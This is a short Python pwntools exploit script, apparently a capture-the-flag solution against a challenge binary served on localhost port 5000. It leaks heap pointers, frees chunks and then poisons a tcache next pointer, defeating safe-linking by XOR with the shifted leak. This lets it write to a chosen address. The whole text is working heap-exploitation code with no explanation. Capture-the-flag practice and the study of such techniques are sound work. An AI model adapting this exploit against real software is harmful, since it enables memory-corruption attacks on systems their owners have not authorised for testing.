from pwn import * 
context.log_level='debug'
elf = ELF("./chal")
#p = process("./chal")
p = remote("127.0.0.1", 5000)
pig = 0x404030 - 0x10
send = lambda st: p.sendlineafter(b"> ", st)

ptrs = []
for i in range(14):
    send(b"1")
    send(f"{i}".encode())
    ptrs.append(int(p.recvline().decode().split(": ")[-1].strip(),16))

for i in range(14):
    send(b"2")
    send(f"{i}".encode())

send(b"3")
send(b"7")
send(p64(pig ^ (ptrs[7] >> 12)))

for i in range(10):
    send(b"1")
    send(f"{i}".encode())

send(b"3")
send(b"8")
send(p64(0x1))

send(b"0")
p.recvall()
